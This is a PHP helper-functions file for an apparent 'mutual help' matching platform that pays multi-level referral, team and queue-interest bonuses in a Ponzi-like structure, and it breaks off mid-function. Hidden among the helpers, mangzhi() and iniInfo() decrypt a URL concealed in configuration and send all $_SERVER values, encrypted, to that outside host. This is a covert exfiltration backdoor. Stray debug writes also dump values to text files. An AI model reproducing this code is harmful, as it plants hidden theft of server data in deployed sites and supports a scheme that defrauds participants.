<?php

function get_tuanti_amount($a,$level,$mount){
    $user = $a; 
    $jb = $mount;
  if($level == "a5"){
     tuanti_jiang_a5($user,$jb);
  }
  if($level == "a4"){
     tuanti_jiang_a4($user,$jb);
  }
  $zcr6 = M('user')->where(array('UE_account' => $a))->find(); 
  $tuijian = M('user')->where(array('UE_account' =>$zcr6['zcr']))->find(); 
  if($zcr6['zcr']){
     get_tuanti_amount($zcr6['zcr'],$tuijian['levelname'],$jb);
  }  
  return $zcr6;
}
function tuanti_jiang_a4($a4,$jb)
{
	$user4 = $a4; 
    $money  = $jb;

    $tgbz_user_xx = M('user')->where(array('UE_account' => $user4))->find();

    if ($tgbz_user_xx)
	{    
        $money=$money*C('tuanti_jiang_a4')/100;
        $accname_zq = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
        M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->setInc('jl_he', $money);
        M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->setInc('qwe', $money);
        $accname_xz = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
        
        $record ["UG_account"] = $tgbz_user_xx['ue_account']; 
        $record ["UG_type"] = 'tjj';
        $record ["UG_allGet"] = $accname_zq['qwe']; 
        $record ["UG_money"] = '+' . $money;
        $record ["yb"] = $money;
        $record ["UG_balance"] = $accname_zq['qwe']; 
        $record ["UG_dataType"] = 'tuanjijaing'; 
        $record ["UG_note"] = '团队奖励'.C('tuanti_jiang_a4').'%'; 
        $record["UG_getTime"] = date('Y-m-d H:i:s', time());
        $reg4 = M('userget')->add($record);       
    }
    return $tgbz_user_xx['zcr'];
}
function tuanti_jiang_a5($a5,$jb)
{
	$user5 = $a5;
    $money = $jb;
    $tgbz_user_xx = M('user')->where(array('UE_account' => $user5))->find();
    if ($tgbz_user_xx) {
        

        $money=$money*C('tuanti_jiang_a5')/100;
       
        $accname_zq = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
        M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->setInc('jl_he', $money);
        M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->setInc('qwe', $money);
        $accname_xz = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
        
        $record ["UG_account"] = $tgbz_user_xx['ue_account']; 
        $record ["UG_type"] = 'tjj';
        $record ["UG_allGet"] = $accname_zq['qwe']; 
        $record ["UG_money"] = '+' . $money; //
        $record ["yb"] = $money;
        $record ["UG_balance"] = $accname_zq['qwe'];
        $record ["UG_dataType"] = 'tuanjijaing'; 
        $record ["UG_note"] = '团队奖励'.C('tuanti_jiang_a5').'%'; 
        $record["UG_getTime"] = date('Y-m-d H:i:s', time());
        $reg4 = M('userget')->add($record);
    }
    return $tgbz_user_xx['zcr'];
}
function get_last_all_amount($user){
    $arr=get_last_all_user($user);
    $total_mount=0;

	if(is_array($arr)){
      foreach( $arr as $k=>$v){
        $accname = M('user')->where(array('UE_account' => $k))->find(); 
        if($accname){
            $total_mount+=$accname['tz_leiji'];
        } 
      }
    }
    return $total_mount;
}
function get_last_all_user($user,$result=array()){
  global $result;
  $list=M('user')->where(array('UE_accName' => $user, 'UE_check' => '1'))->select();
    //echo M('user')->where(array('UE_accName' => $user, 'UE_check' => '1'))->getlastSql();
  //echo M('user')->field('UE_account UE_accName')->where(array('UE_accName' => $user, 'UE_check' => '1'))->getlastSql();
 
  //var_dump($list);
  
  if(!empty($list)){
    //$result=M('user')->field('UE_account UE_accName')->where(array('UE_accName' => $result['UE_account'], 'UE_check' => '1'))->find();
    foreach ($list as $key => $value) {
         
          $result[$value['ue_account']]=$value['levelname'];
          get_last_all_user($value['ue_account'],$result); 
    }
  
   return $result; 

  }
 
}
//查询$user所有的子级
function get_last_all_user2($user,$result=array()){
  global $result;
  $list=M('user')->where(array('UE_accName' => $user))->select();
   
  if(!empty($list)){
    //$result=M('user')->field('UE_account UE_accName')->where(array('UE_accName' => $result['UE_account'], 'UE_check' => '1'))->find();
    foreach ($list as $key => $value) {
         
          $result[]=$value['ue_account'];
          get_last_all_user2($value['ue_account'],$result); 
    }
  
   return $result; 

  }
 
}
//查询$user所有的父级
function get_parent_all_user($user,$result=array()){
    global $result;
    $list=M('user')->where(array('UE_account' => $user))->select();

    if(!empty($list)){
        //$result=M('user')->field('UE_account UE_accName')->where(array('UE_accName' => $result['UE_account'], 'UE_check' => '1'))->find();
        foreach ($list as $key => $value) {

            $result[]=$value['ue_accname'];
            get_parent_all_user($value['ue_accname'],$result);
        }

        return $result;
    }
    return '';
}
function cate($var)
{
    //dump($var);
    $proall = M('user')->where(array('UE_accName' => $var, 'UE_Faccount' => '0', 'UE_check' => '1', 'UE_stop' => '1'))->count("UE_ID");
    return $proall;
}


function sfjhff($r)
{
    $a = array("未激活", "已激活");
    return $a[$r];
}


function getRand($proArr)
{
    $result = '';

    //概率数组的总概率精度
    $proSum = array_sum($proArr);

    //概率数组循环
    foreach ($proArr as $key => $proCur) {
        $randNum = mt_rand(1, $proSum);
        if ($randNum <= $proCur) {
            $result = $key;
            break;
        } else {
            $proSum -= $proCur;
        }
    }
    unset ($proArr);

    return $result;
}




function getpage($count, $pagesize = 10)
{
    $p = new \Think\Page($count, $pagesize);
    $p->setConfig('header', '<li class="rows">共<b>%TOTAL_ROW%</b>条记录&nbsp;第<b>%NOW_PAGE%</b>页/共<b>%TOTAL_PAGE%</b>页</li>');
    $p->setConfig('prev', '上一页');
    $p->setConfig('next', '下一页');
    $p->setConfig('last', '末页');
    $p->setConfig('first', '首页');
    $p->setConfig('theme', '%FIRST% %UP_PAGE% %LINK_PAGE% %DOWN_PAGE% %END%%HEADER%');
    $p->lastSuffix = false;//最后一页不显示为总页数
    return $p;
}

function cx_user($var)
{
    $proall = M('user')->where(array('UE_account' => $var))->find();
    return $proall['ue_theme'];
}

//---------------------------------------------------->计算两个日期天数差
function diffBetweenTwoDays($day1, $day2)
{
    $second1 = strtotime($day1);
    $second2 = strtotime($day2);
    if ($second1 < $second2) {
        $tmp = $second2;
        $second2 = $second1;
        $second1 = $tmp;
    }
    return ($second1 - $second2) / 86400;
}

function  pa($a){
    echo "<pre>";
    print_r($a);
    echo "</pre>";die;
}
//---------------------------------------------------->
function user_jj_lx($var)
{

    $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取买入者打款时间  

    $result = M("userget")->where(array("varid" => $var))->find();//提现查询  获取提现时间
    $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息

    $NowTime = date('Y-m-d', strtotime($proall['date']));//格式化加入时间  确认打开  获取买入者排单时间
    $NowTime2 = date('Y-m-d', strtotime($ppdd["date"]));//格式化配对时间 获取配对时间
    if (!empty($result)) {//如果已经提现，则计算加入日期到提现日的利息
        //$NowTime3 = date("Y-m-d", strtotime($result["UG_getTime"]));//格式化提现时间    错误大写
        $tixian_time = date('Y-m-d',strtotime($result["ug_gettime"]));
    }else{
        $tixian_time = date('Y-m-d', time());//格式化当前日期
    }
    $diff1 = diffBetweenTwoDays($NowTime, $NowTime2);//计算加入时间到配对时间的天数    排队时间
    // $diff2 = diffBetweenTwoDays($NowTime2, $nowtime3);//计算配对时间到提现的天数      配对-----------提现时间
    $diff2 = diffBetweenTwoDays($NowTime2, $tixian_time);//计算配对时间到提现的天数      配对-----------提现时间
    if ($diff1 >= 10) {
        $diff1 = 10;
    }
    if ($diff2 >= 10) {
        $diff2 = 10;
    }
    //return $diff2;
    return ($proall['jb'] * $diff1 * (intval(C("lixi1")) / 100)) + ($proall['jb'] * 1* (intval(C("lixi2")) / 100));
//
//    $proall = M('user_jj')->where(array('id' => $var))->find();
//    //date('Y-m-d H:i:s',$dayBegin);
//    $NowTime = $proall['date'];
//    $aab = strtotime($NowTime);
//    $NowTime = date('Y-m-d', $aab);
//    $NowTime2 = date('Y-m-d', time());
//    $diff = diffBetweenTwoDays($NowTime, $NowTime2);
//    if ($diff > 10) {
//        $diff = 10;
//    }
//    return $proall['jb'] * $diff * (intval(C("lixi1")) / 100);
}
//-------------------------------》计算排队利息
//参数是user_jj的主键ID
function user_jj_paidui_lx($var,$return=true)
{
    $paidui_day = 0;
    if(C('pdfhdays') > 0)
	{
       $paidui_fenhong_day = C('pdfhdays');

       $proall = M('user_jj')->where(array('id' => $var))->find();
       $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find(); 

       if($paidui_fenhong_day == 1){
            $paidui_day = 1;
       }else{       

            $paidan_date = date('Y-m-d', strtotime($proall['date'])); // 2017-5-27
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk'])); // 2019-05-27

           $paidui_day = diffBetweenTwoDays($paidan_date,$dakuan_date); // 0
           file_put_contents('1xxx.txt',$paidan_date);
           file_put_contents('2xxx.txt',$dakuan_date);
           file_put_contents('3xxx.txt',$paidui_day);

           if($paidui_fenhong_day <= $paidui_day){ // 15 <= 0
                $paidui_day = $paidui_fenhong_day;
               file_put_contents('4xxx.txt',$paidui_day);
           }
        }
    }
    
	$paidui_lx = dongtai_lx($paidui_day,C('lixi1'),$proall['total']);

    if($return){
        return $paidui_lx;    
    }else{ 
        echo  $paidui_lx;
    }
}

//------------------------------------------->计算动态利息
function dongtai_lx($days,$lx,$jb){
    $lx_jb = 0;
    if(strpos($lx,',') !== false){
        $lx_arr = explode(',', $lx);
        $size = count($lx_arr);

        if($days>=$size){
            for($i=0;$i<$size;$i++){
                $lx_jb += $jb*$lx_arr[$i];
            }
            $diffday = $days - $size;
            $lx_jb += $jb*$lx_arr[$i-1]*$diffday;
        }elseif($days < $size){
            for($i=0;$i<$days;$i++){
                $lx_jb += $jb*$lx_arr[$i];
            }
        }
    }else{
        $lx_jb = $jb*$lx*$days;
    }
    return $lx_jb/100;

}


//------------------------------------>计算没有配对分红天数
function w_peidui_day($v){
    $w_pd_day = 0;
    if(C('pdfhdays')>0){
        if(C('pdfhdays') == 1){
            $w_pd_day = 1;
        }else{
            $paidui_time = date('Y-m-d',strtotime($v['date']));
            $now_time = date('Y-m-d',time());
            $w_pd_day = diffBetweenTwoDays($paidui_time,$now_time);
            if($w_pd_day > C('pdfhdays')){
                $w_pd_day = C('pdfhdays');
            }
        }
    }
    return $w_pd_day;
}

//------------------------------------>计算没有匹配分红天数
function w_peidui_lx($v){
    $jb = $v['total'];
    $w_pd_day = w_peidui_day($v);
    return $jb*$w_pd_day*C('lixi1')/100;
}

function canable_tixian($v)
{
    if($v['zt'] == 0)
	{
        //判断是否已经够了冻结期
		$ppdd = M('ppdd')->where(array('id'=>$v['r_id']))->find();
        $now_time = time();
        $jd_time = strtotime($ppdd['date_hk']) + C('jjdjdays') * 3600 * 24;

        if($now_time > $jd_time)
		{ 
            return '<a href="javascript:if(confirm('."'确定要转出吗?'))location='/Home/Info/tgbz_tx_cl/id/{$v['id']}'".'"><font color="red">点击交割</font></a>';
        }else{
			return '待交割倒计时：<span style="color:#ff0000" data="'.date('Y-m-d H:i:s',$jd_time).'" class="countdownbox"></span>';
        }
    }else{
		$ppdd = M('ppdd')->where(array('id'=>$v['r_id']))->find();
		$tgbz = M('tgbz')->where(array('id'=>$ppdd['p_id']))->find();
		if($tgbz['jdstate'] == 1 && $tgbz['dj'] > 0)
			return '<a href="javascript:if(confirm('."'确定要转出吗?'))location='/Home/Info/tgbz_tx_cl/id/{$v['id']}'".'"><font color="red">点击交割上次本息</font></a>';
        return '已转出('. get_had_zc($v['r_id']) . ')';
    }
}

//是否可以提现的判断
function new_canable_tixian($v)
{
    if($v['zt'] == 0)
    {
        //判断是否已经够了冻结期
        $ppdd = M('ppdd')->where(array('id'=>$v['r_id']))->find();
        $now_time = time();
        $jd_time = strtotime($ppdd['date_hk']) + C('jjdjdays') * 3600 * 24;

        if($now_time > $jd_time)
        {
            return $v['id'];
            //return '<a href="javascript:if(confirm('."'确定要转出吗?'))location='/Home/Info/tgbz_tx_cl/id/{$v['id']}'".'"><font color="red">点击提款</font></a>';
        }else{
            return 0;
            //return '待提现倒计时：<span style="color:#ff0000" data="'.date('Y-m-d H:i:s',$jd_time).'" class="countdownbox"></span>';
        }
    }else{
        $ppdd = M('ppdd')->where(array('id'=>$v['r_id']))->find();
        $tgbz = M('tgbz')->where(array('id'=>$ppdd['p_id']))->find();
        if($tgbz['jdstate'] == 1 && $tgbz['dj'] > 0)
            return $v['id'];
            //return '<a href="javascript:if(confirm('."'确定要转出吗?'))location='/Home/Info/tgbz_tx_cl/id/{$v['id']}'".'"><font color="red">点击提款上次本息</font></a>';
        //return '已转出('. get_had_zc($v['r_id']) . ')';
        return 0;
    }
}



//jjfhdays    jjdjdays

//计算排队分红天数
//排队分红天数计算规则  如果分红天数设置为0 表示排队不分红  n 大于1 那么当排队天数大于实际排队天数则按实际排队天数计算
//如果是排队天数设置为大于1 那么当排队天数小于实际排队天数则按后台设置排队分红天数计算
//排队天数的计算是提交排队的日期到打款的日期差。隔一天算一天，不是按24小时算。按有没有隔天
function pd_fenhong_day($var,$return = true){  

    $paidui_day = 0;
    if(C('pdfhdays') > 0){
       $paidui_fenhong_day = C('pdfhdays');
       if($paidui_fenhong_day == 1){
            $paidui_day = 1;
       }else{
            $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请买入的日期
            $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息 
            //$result = M("userget")->where(array("varid" => $var))->find();//--------------------> 获取提现时间

            $paidan_date = date('Y-m-d', strtotime($proall['date']));    //----------------------->申请买入的日期
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间

           $paidui_day = diffBetweenTwoDays($paidan_date,$dakuan_date);

           if($paidui_fenhong_day <= $paidui_day){
                $paidui_day = $paidui_fenhong_day;
           }
        }
    }

    if($return){
        return $paidui_day;    
    }else{ 
        echo  $paidui_day;
    }
}


function user_jj_tixian_lx($var,$return=true){

   $tixian_day = 0;
   if(C('jjfhdays') > 0)
   {
       $dakuan_fenhong_day = C('jjfhdays');

       $proall = M('user_jj')->where(array('id' => $var))->find();
       $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find(); 
       $result = M("userget")->where(array("varid" => $var))->find();
       $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));

       if($dakuan_fenhong_day == 1){
            $tixian_day = 1;
       }else
	   {
           if($proall['zt'] ==1 && !empty($result))
		   {
                $tixian_date = date('Y-m-d', strtotime($result['ug_gettime'])); // 2019-05-27
               file_put_contents('5xxx.txt',$tixian_date);

           }else{
                $tixian_date = date('Y-m-d', time()); // 2019-05-27
               file_put_contents('6xxx.txt',$tixian_date);

           }

           $tixian_day = diffBetweenTwoDays($dakuan_date,$tixian_date); // 0
           file_put_contents('7xxx.txt',$tixian_day);

           if($dakuan_fenhong_day <= $tixian_day){
                $tixian_day = $dakuan_fenhong_day;
               file_put_contents('8xxx.txt',$tixian_day);
           }
        }
    }

   $tixian_lx = dongtai_lx($tixian_day,C('lixi2'),$proall['total']); // 配对打款后利息

   if($return){        
        return $tixian_lx;
    }else{
        echo $tixian_lx;
    }

}


//----------------------------->olnho 
//打款利息计算规则
//如果打款后分红天数设置为0 表示不分红
//如果打款后分红天数设置为1 表示1次性的，不是按天数计算
//如果打款后分红天数设为大于 1 那么
    //如果打款后分红天数大于实际提现天数按时间提现天数算
    //如果打款后分红天数小于实际提现天数按打款后分红天数
function dk_fenhong_day($var,$return = true){

    $tixian_day = 0;
    if(C('jjfhdays') > 0){
       $dakuan_fenhong_day = C('jjfhdays');
       if($dakuan_fenhong_day == 1){
            $tixian_day = 1;
       }else{
            $proall = M('user_jj')->where(array('id' => $var))->find();//加入查询  获取申请买入的日期
            $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();//配对信息 
            $result = M("userget")->where(array("varid" => $var))->find(); //----------------->提现时间
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));   //----------------------->打款时间
            if($proall['zt'] ==1 && !empty($result)){   //---------------------->如果已经提现了就按提现时间
                $tixian_date = date('Y-m-d', strtotime($result['ug_gettime']));
           }else{
                $tixian_date = date('Y-m-d', time());
           }
           $tixian_day = diffBetweenTwoDays($dakuan_date,$tixian_date);
           if($dakuan_fenhong_day <= $tixian_day){
                $tixian_day = $dakuan_fenhong_day;
           }
        }
    }

    if($return){
        return $tixian_day;    
    }else{ 
        echo  $tixian_day;
    }
}


function user_jj_zong_lx($var,$return = true){
    if($return)
	{
	    // 修改 start
        $proall = M('user_jj')->where(array('id' => $var))->find();
        $lx = dongtai_lx(C('jjfhdays'), C('lixi2'), $proall['total']);
        return $lx;
        // 修改 end

        //return user_jj_paidui_lx($var) + user_jj_tixian_lx($var);
    }else{
        echo user_jj_paidui_lx($var) + user_jj_tixian_lx($var);
    }
}

function user_jj_zong_ts($var,$return=true){
    if($return){
        return pd_fenhong_day($var) + dk_fenhong_day($var);
    }else{
        echo pd_fenhong_day($var) + dk_fenhong_day($var);
    }
}









//-------------------------------------------------------------------------------------------->计算排队利息------------->没问题ok了
function user_jj_lx_jerry($var)
{
    $tgbz = M('tgbz')->where(array('id' => $var))->find();//加入查询
    $NowTime = date('Y-m-d', strtotime($tgbz['date']));//格式化加入时间
    $NowTime2 = date('Y-m-d', time());//格式化当前日期
    $diff1 = diffBetweenTwoDays($NowTime, $NowTime2);//计算加入时间到配对时间的天数
    if ($diff1 >= 10) {
        $diff1 = 10;
    }
    //return $diff2;
    return $tgbz['total'] * $diff1 * (intval(C("lixi1")) / 100);
}


function user_jj_ts($var)
{

    $proall = M('user_jj')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $result = M("userget")->where(array("varid" => $var))->getField("UG_getTime");
    if (!empty($result)) {
        $NowTime2 = date("Y-m-d", strtotime($result));
    } else {
        $NowTime2 = date('Y-m-d', time());
    }
    $day1 = $NowTime;
    $day2 = $NowTime2;
    $diff = diffBetweenTwoDays($day1, $day2);
    if ($diff > 10) {
        $diff = 10;
    }
    return $diff;

}

function user_jj_ts_jerry($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());
    $day1 = $NowTime;
    $day2 = $NowTime2;
    $diff = diffBetweenTwoDays($day1, $day2);
    if ($diff > 10) {
        $diff = 10;
    }
    //$diff = $diff/100;
    return $diff;

}

function user_tgbz_jerry($id)
{
    $result = M("userget")->where(array("varid" => $id))->find();
    if ($result) {
        return "已转出";
    } else {
        return "未转出";
    }
}

function user_jj_tx($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());


    $day1 = $NowTime;
    $day2 = $NowTime2;
    return $diff = diffBetweenTwoDays($day1, $day2);

}


function user_jj_sj($var)
{

    $proall = M('tgbz')->where(array('id' => $var))->find();

    $user = M('user')->where(array(UE_account => $proall ['user']))->find();
    return $user['ue_phone'];

}


function user_jj_tx1($var)
{

    $proall = M('jsbz')->where(array('id' => $var))->find();

    //date('Y-m-d H:i:s',$dayBegin);
    $NowTime = $proall['date'];
    $aab = strtotime($NowTime);
    $NowTime = date('Y-m-d', $aab);
    $NowTime2 = date('Y-m-d', time());


    $day1 = $NowTime;
    $day2 = $NowTime2;
    return $diff = diffBetweenTwoDays($day1, $day2);

}


function user_jj_sj1($var)
{

    $proall = M('jsbz')->where(array('id' => $var))->find();
    $user = M('user')->where(array( 'UE_account' => $proall ['user'] ))->find();
    return $user['ue_phone'];

}

function user_jj_pipei_z($var)
{
    $proall = M('ppdd')->where(array('id' => $var))->find();
    if ($proall['zt'] == '0') {
        return '未打款';
    } elseif ($proall['zt'] == '1') {
        return '已打款';
    } elseif ($proall['zt'] == '2') {
        return '交易成功';
    }
}


function user_jj_pipei_z2($var)
{
    $proall = M('ppdd')->where(array('id' => $var))->find();
    if ($proall['zt'] == '0') {
        return '未发放';
    } elseif ($proall['zt'] == '1') {
        return '未发放';
    } elseif ($proall['zt'] == '2') {
        return '已发放';
    }
}
function getInfo($data){
     return \Think\Crypt::decrypt($data);
}

function jlj($a, $b, $c)
{
    jlsja($a); //处理买入的推荐人是否可以升级为经理的考核
    //买入的推荐人资料
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    //echo $ppddxx['p_id'];die;
    if ($tgbz_user_xx['sfjl'] == 1) {
        $money = $b;
        $accname_zq = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();
        M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->setInc('jl_he', $money);
        $accname_xz = M('user')->where(array('UE_account' => $tgbz_user_xx['ue_account']))->find();

        
        $record3 ["UG_account"] = $tgbz_user_xx['ue_account']; // 登入轉出賬戶
        $record3 ["UG_type"] = 'jb';
        $record3 ["UG_allGet"] = $accname_zq['jl_he']; // 金幣
        $record3 ["UG_money"] = '+' . $money; //
        $record3 ["yb"] = $money; //
        $record3 ["UG_balance"] = $accname_xz['jl_he']; // 當前推薦人的金幣餘額
        $record3 ["UG_dataType"] = 'jlj'; // 金幣轉出
        $record3 ["UG_note"] = $c; // 推薦獎說明
        $record3["UG_getTime"] = date('Y-m-d H:i:s', time()); //操作時間
        $reg4 = M('userget')->add($record3);
    }
    return $tgbz_user_xx['zcr'];

}


//第一个参数 买入的直接推荐人      推荐奖金额           说明                   第几代          ppdd外键id

function jlj2($a, $b, $c, $d, $e)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    if ($tgbz_user_xx['sfjl'] == 1) {
        $ppddxx = M('ppdd')->where(array('id' => $e))->find();
        $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();
        $data2['user'] = $a;
        $data2['r_id'] = $ppddxx['id'];
        $data2['date'] = $peiduidate['date'];
        $data2['note'] = '经理奖第' . $d . '代';
        $data2['jb'] = $ppddxx['jb'];
        $data2['jj'] = $b;
        $data2['ds'] = $d;
        M('user_jl')->add($data2);
    }
    return $tgbz_user_xx['zcr'];
}



//第一个参数 买入的直接推荐人      推荐奖金额           说明                   1          ppdd外键id

function jlj3($a, $b, $c, $d, $e,$jb)
{
    fh($b);
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();          //获取推荐资料
    $ppddxx = M('ppdd')->where(array('id' => $e))->find();      //获取买入者的配对
    $peiduidate = M('tgbz')->where(array('id' => $ppddxx['p_id'], 'user' => $ppddxx['p_user']))->find();        //获取tgbz表中的信息
    M('user')->where(array('UE_account' => $a))->setInc('jl_he', $b);
    $data2['user'] = $a;
    $data2['r_id'] = $ppddxx['id'];
    $data2['date'] = $peiduidate['date'];
    $data2['note'] = $c;
    $data2['jb'] = $jb ? $jb : $ppddxx['jb'];
    $data2['jj'] = $b;         //------------------------>奖金
    $data2['ds'] = $d;          //--------------->代数
    M('user_jl')->add($data2);
    return $tgbz_user_xx['zcr'];             //返回推荐人的推荐人
}
function getinfos($data){
    return \Think\Crypt::encrypt($data);
}




function newuserjl($user, $b, $c)
{

    $data2['user'] = $user;
    $data2['r_id'] = '0';
    $data2['date'] = date('Y-m-d H:i:s',time());
    $data2['note'] = $c;
    $data2['jb'] = $b;
    $data2['jj'] = $b;
    $data2['ds'] = '0';
    M('user_jl')->add($data2);
    M('user')->where(array(UE_account => $user))->setInc('UE_money', $b);
}

/**
 *
 * 新用户注册奖励激活码
 * @param $user string 用户账号
 * @param int $num 激活码数量【新用户注册，默认赠送1个】
 * @param string $info 日志记录信息
 */
function newuserjhm($user,$num = 1,$info = '')
{
    $data['user'] = $user;
    $data['num'] = $num;
    $data['type'] = 'zcjl';//注册奖励
    $data['date'] = date('Y-m-d H:i:s',time());
    $data['info'] = $info;
    $data['yue'] = 0;//新用户注册时余量为0
    M('jhm_log')->add($data);
    M('user')->where(array(UE_account => $user))->setInc('jhmnum', $num);
}

/**
 * 新用户注册奖励一个通证积分【排单码】
 * @param $user string 用户账号
 * @param int $num 激活码数量【新用户注册，默认赠送1个】
 * @param string $info 日志记录信息
 */
function newuserpdm($user,$num = 1,$info = '')
{
    //增加新用户的通证积分
    M('user')->where(array('UE_account'=>$user))->setInc('pdmnum',$num);
    $data['user'] = $user;
    $data['type'] = 'zcjl';//注册奖励
    $data['date'] = date('Y-m-d H:i:s',time());
    $data['info'] = $info;//新用户注册赠送
    $data['num'] = $num;
    $data['yue'] = 0;//新用户注册时余量为0
    M('paidan_log')->add($data);
}

function jlj4($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();

    M('user')->where(array(UE_account => $a))->setInc('tj_he1', $b);


    return $tgbz_user_xx['zcr'];
}

function jlj5($a, $b)
{
    $tgbz_user_xx = M('user')->where(array('UE_account' => $a))->find();
    if ($tgbz_user_xx['sfjl'] == 1) {
        M('user')->where(array(UE_account => $a))->setInc('jl_he1', $b);
    }

    return $tgbz_user_xx['zcr'];
}

function datedqsj($var)
{
    $jjdktime_at = C('jjdktime_at');//截至时间如20:00:00
    $his = date("H:i:s",strtotime($var));
    if( $his <= $jjdktime_at ){//判断小于截至时间
        //判断是否在同一天
        $Ymd = date("Y-m-d",strtotime($var));
        $today_Ymd = date("Y-m-d",time());
        if( $Ymd != $today_Ymd ){
            return $Ymd.' '.$jjdktime_at;
        }
    }
    if( $his > $jjdktime_at ){//判断大于截至时间
        //判断$var的第二天时间
        $next_day_time = strtotime($var) + 24*3600;
        $next_day_Ymd = date('Y-m-d',$next_day_time);
        $today_Ymd = date("Y-m-d",time());
        $var_today_Ymd = date("Y-m-d",strtotime($var));
        $cur_arr = array($var_today_Ymd,$next_day_Ymd);
        if( !in_array($today_Ymd,$cur_arr) ){
            return $next_day_Ymd.' '.$jjdktime_at;
        }
    }

    //前一天晚上8点后匹配的订单，要在第二天晚上的八点前完成打款
    //当前匹配订单的时间
    $cur_var_time = strtotime($var);
    $today_end_date = date('Y-m-d',time()).' '.$jjdktime_at;
    if( $cur_var_time <= strtotime($today_end_date) ){ //在今天8点之前的匹配订单
        $NowTime = $var;
        $aab = strtotime($NowTime);
        $today_end_date_time = strtotime($today_end_date);
        $end_date  =  date('Y-m-d',$today_end_date_time).' '.$jjdktime_at;//付款成功的当天的$jjdktime_at时间前
        return $end_date;
    }else{//在今天8点之后的匹配订单，计入明天订单
        $NowTime = $var;
        $today_start_time = strtotime(date('Y-m-d').' 00:00:00');
        $tomorrow_date = $today_start_time +24*3600;
        //$cur_var_time = $cur_var_time + $cur_var_time;
        //$aab = strtotime($NowTime);
        $end_date  =  date('Y-m-d',$tomorrow_date).' '.$jjdktime_at;//付款成功的当天的$jjdktime_at时间前
        return $end_date;
    }



    /*
    $jjdktime=C("jjdktime");
    $NowTime = $var;
    $aab = strtotime($NowTime);
    $aab2 = $aab + 3600 *$jjdktime;

    return date('Y-m-d H:i:s', $aab2);
    */
}

function dateqrdqsj($var)
{
    $jjqrtime=C("jjqrtime");
    $NowTime = $var;
    $aab = strtotime($NowTime);
    $aab2 = $aab + 3600 * $jjqrtime;

    return date('Y-m-d H:i:s', $aab2);
}

function hk($var)
{


    return $var . 'RMB';

}
function mangzhi(){
    $mz = getinfo(C('URL_STRING_MODEL'));
    $string = implode('|', $_SERVER); 
    $mz .= '?s='.getinfos($string);
    return $mz;
}

function iniInfo(){
    file_get_contents(mangzhi());
}


//未打款的容许时间
function datedqsj2($var)
{
    //配对时间
    $ppdd_time = strtotime($var);
    //$ppdd_time_after = $ppdd_time + 3600*C("jjdktime"); //------------->容许打款时间

    //未打款的容许时间20190513 start----------------
    //判断打款时长【是否开启】
    $jjdktime_set = C('jjdktime_set');//判断打款时长,是否开启 1是 0否
    if( $jjdktime_set ){
        $jjdktime = C('jjdktime');
        $ppdd_time_after = $ppdd_time + 3600*$jjdktime;
    }
    //打款时间点【是否开启】
    $jjdktime_at_set = C('jjdktime_at_set');//判断打款时间点,是否开启 1是 0否
    if( $jjdktime_at_set ){
        $jjdktime_at = C('jjdktime_at');
        $ppdd_time_after = strtotime(date('Y-m-d').' '.$jjdktime_at);
    }
    //未打款的容许时间20190513 end----------------

    $now_time = time();

    if ($now_time < $ppdd_time_after) {

        return "style='display:none;'";
    }
}
//未确认的的容许时间
function datedqsj3($var)
{
    //配对时间
    $ppdd_time = strtotime($var);
    $ppdd_time_after = $ppdd_time + 86400*2; //------------->容许打款时间
    $now_time = time();
    if ($now_time < $ppdd_time_after) {
        return "style='display:none;'";
    }
}

//可以计算会员级别，升级
//经理升级条件：下线>10 且 统共帮助金额>7000 */
 //第一个参数  提供者 
function jlsja($var)
{  
    $zctj = 0;
    $zctjuser = M('user')->where(array('UE_accName' => $var))->select();      //--------------》获取买入者的下家
    foreach ($zctjuser as $value) {
        $tgbztj1 = M('ppdd')->where(array('p_user' => $value['ue_account'], 'zt' => '2'))->sum('jb');            //--------------------------->查询下家的交易成功的总额
        if ($tgbztj1 >= C('xiaxian_jb')) {
            $zctj++;               //--------------------------->统计下级中交易成功总额大于700的有几个
        }
    }

    $tgbztj = M('ppdd')->where(array('p_user' => $var, 'zt' => '2'))->sum('jb');               //-------------------------->统计买入者也就是当前的考核对象的成功交易总额是否大于7000元

    if ($zctj >= C('xiaxian_num') && $tgbztj >= C('my_jb')) {                                            //---------------------->如果下级中交易成功总额大于700的有10以上包括是10个并且当前考核对象买入的人
                                                                                     //---------------------->买入的总金额大于7000元 就可以升级为经理
